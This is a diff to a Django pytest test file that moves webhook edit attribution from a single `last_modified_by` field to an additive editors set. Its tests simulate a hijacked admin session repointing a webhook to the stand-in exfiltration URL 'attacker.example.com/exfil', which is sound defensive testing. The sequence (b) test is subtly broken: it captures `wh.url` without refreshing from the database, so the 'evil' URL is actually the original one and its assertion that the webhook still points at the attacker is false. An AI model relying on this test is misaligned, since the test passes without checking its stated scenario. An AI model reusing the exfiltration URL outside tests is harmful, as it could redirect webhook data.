@@ -222,14 +222,14 @@ def test_update_webhook_refuses_a_token_caller_even_when_admin(
 
 
 @pytest.mark.django_db
-def test_update_stamps_last_modified_by_only_on_url_or_secret_change(
-    admin_client: APIClient, project: Project, webhook: Webhook
+def test_update_records_an_editor_only_on_url_or_secret_change(
+    admin_client: APIClient, project: Project, webhook: Webhook, user: object
 ) -> None:
-    """A write that touches neither `url` nor `secret` must not stamp
-    `last_modified_by` (#4461) — only those two fields make an update as
-    durable a grant as create, and `revoke_personal_durable_grants` sweeps on
-    this field, so stamping it on an unrelated write (relabeling `events`,
-    toggling `is_active`) would widen who the sweep contains for no reason.
+    """A write that touches neither `url` nor `secret` must not record an editor
+    row (#4461) — only those two fields make an update as durable a grant as
+    create, and `revoke_personal_durable_grants` sweeps on this set, so
+    recording it on an unrelated write (relabeling `events`, toggling
+    `is_active`) would widen who the sweep contains for no reason.
     """
     resp = admin_client.patch(
         f"/api/v1/projects/{project.pk}/webhooks/{webhook.pk}/",
@@ -237,8 +237,7 @@ def test_update_stamps_last_modified_by_only_on_url_or_secret_change(
         format="json",
     )
     assert resp.status_code == 200, resp.data
-    webhook.refresh_from_db()
-    assert webhook.last_modified_by_id is None
+    assert not webhook.editors.exists()
 
     resp = admin_client.patch(
         f"/api/v1/projects/{project.pk}/webhooks/{webhook.pk}/",
@@ -246,8 +245,7 @@ def test_update_stamps_last_modified_by_only_on_url_or_secret_change(
         format="json",
     )
     assert resp.status_code == 200, resp.data
-    webhook.refresh_from_db()
-    assert webhook.last_modified_by_id is not None
+    assert set(webhook.editors.values_list("user_id", flat=True)) == {user.pk}
 
 
 @pytest.mark.django_db
@@ -262,7 +260,7 @@ def test_repoint_by_a_different_admin_is_caught_by_that_admins_own_sweep(
     DIFFERENT admin's own password reset/off-boarding left the row untouched,
     and only an instance-wide `--all` sweep ever caught it. The repointing
     admin's own containment must catch it instead, because the sweep also
-    matches `last_modified_by`.
+    matches ``webhook.editors``.
 
     The registrant here (`user`) is never contained in this test — proving
     the fix means the ADMIN WHO REPOINTED IT (not the creator) triggers
@@ -295,7 +293,7 @@ def test_repoint_by_a_different_admin_is_caught_by_that_admins_own_sweep(
 
     wh.refresh_from_db()
     assert wh.created_by_id == user.pk
-    assert wh.last_modified_by_id == coadmin.pk
+    assert set(wh.editors.values_list("user_id", flat=True)) == {coadmin.pk}
 
     # The repointing admin's own containment catches it — the fix. `user`
     # (the registrant) is never touched by this call, so a pre-fix sweep
@@ -304,6 +302,126 @@ def test_repoint_by_a_different_admin_is_caught_by_that_admins_own_sweep(
     wh.refresh_from_db()
     assert wh.is_active is False
     assert wh.disabled_at is not None
+
+
+@pytest.mark.django_db
+def test_sequence_a_later_secret_rotation_by_the_registrant_does_not_erase_attribution(
+    project: Project, user: object
+) -> None:
+    """Round-2 BLOCKER, sequence (a): a mutable "last modified by" field broke on
+    exactly this sequence — Admin B's hijacked session repoints `url`, then
+    Admin A (the registrant) later does a routine, unrelated secret rotation.
+    A single-field stamp would be overwritten to A, and B's own password
+    reset/off-boarding would no longer match. The additive editors set must
+    not have that failure: B's row stays, regardless of what A does afterward.
+    """
+    from trueppm_api.apps.access.services import revoke_personal_durable_grants
+
+    ProjectMembership.objects.update_or_create(
+        project=project, user=user, defaults={"role": Role.ADMIN}
+    )
+    coadmin_b = User.objects.create_user(username="wh_seq_a_b", password="pw")
+    ProjectMembership.objects.create(project=project, user=coadmin_b, role=Role.ADMIN)
+
+    wh = Webhook.objects.create(
+        project=project,
+        url="https://example.com/original",
+        secret="original-secret-1234567890123456",
+        events=["task.created"],
+        created_by=user,
+    )
+
+    # B's hijacked session repoints the URL.
+    b_client = APIClient()
+    b_client.force_authenticate(user=coadmin_b)
+    resp = b_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"url": "https://attacker.example.com/exfil"},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+
+    # A — the registrant, acting legitimately and much later — rotates the
+    # secret. This must NOT remove B from the editors set.
+    a_client = APIClient()
+    a_client.force_authenticate(user=user)
+    resp = a_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"secret": "b" * 40},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+
+    wh.refresh_from_db()
+    assert set(wh.editors.values_list("user_id", flat=True)) == {coadmin_b.pk, user.pk}
+
+    # B's own containment still catches the row.
+    revoke_personal_durable_grants(coadmin_b)
+    wh.refresh_from_db()
+    assert wh.is_active is False
+
+
+@pytest.mark.django_db
+def test_sequence_b_a_later_events_only_put_does_not_erase_attribution(
+    project: Project, user: object
+) -> None:
+    """Round-2 BLOCKER, sequence (b): same repoint by B, but A's later write is a
+    PUT that only means to change `events` — PUT requires `url` in the request
+    body, so the unchanged, still-evil URL is present in `validated_data` too.
+    A single-field stamp flipped to A on this write even though A touched
+    neither field in substance; the additive editors set does not, because B's
+    row is never removed, and A also lands in the set (A did re-submit `url`,
+    so by WebhookViewSet.perform_update's "url or secret present" rule A is
+    recorded too — harmless, since A's own containment already covers A).
+    """
+    from trueppm_api.apps.access.services import revoke_personal_durable_grants
+
+    ProjectMembership.objects.update_or_create(
+        project=project, user=user, defaults={"role": Role.ADMIN}
+    )
+    coadmin_b = User.objects.create_user(username="wh_seq_b_b", password="pw")
+    ProjectMembership.objects.create(project=project, user=coadmin_b, role=Role.ADMIN)
+
+    wh = Webhook.objects.create(
+        project=project,
+        url="https://example.com/original",
+        secret="original-secret-1234567890123456",
+        events=["task.created"],
+        created_by=user,
+    )
+
+    b_client = APIClient()
+    b_client.force_authenticate(user=coadmin_b)
+    resp = b_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"url": "https://attacker.example.com/exfil"},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+    evil_url = wh.url  # unchanged by A's PUT below
+
+    # A sends a full PUT meaning only to add an event, but PUT requires `url`
+    # in the body — the still-evil URL rides along, unchanged.
+    a_client = APIClient()
+    a_client.force_authenticate(user=user)
+    resp = a_client.put(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {
+            "url": evil_url,
+            "events": ["task.created", "task.updated"],
+        },
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+
+    wh.refresh_from_db()
+    assert wh.url == evil_url  # still pointed at the attacker
+    assert coadmin_b.pk in set(wh.editors.values_list("user_id", flat=True))
+
+    # B's own containment still catches the row.
+    revoke_personal_durable_grants(coadmin_b)
+    wh.refresh_from_db()
+    assert wh.is_active is False
 
 
 @pytest.mark.django_db
